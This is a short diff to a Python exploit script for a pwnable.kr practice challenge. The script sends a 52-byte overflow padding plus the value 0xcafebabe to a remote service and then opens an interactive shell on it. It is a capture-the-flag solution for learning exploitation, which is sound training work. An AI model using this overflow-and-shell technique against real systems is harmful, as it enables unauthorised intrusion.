@@ -29,7 +29,7 @@ print("[*] Pwning...")
 s = shoe.Shoe('pwnable.kr', 9000)
 
 offset = 52
-pwn = "A" * offset + struct.pack("<I", 0xcafebabe)
-
-s.write(pwn+"\n")
+pwn = b"A" * offset + struct.pack("<I", 0xcafebabe)
+print(pwn)
+s.write(pwn+b"\n")
 s.tie() # Should be able to "ls -la"
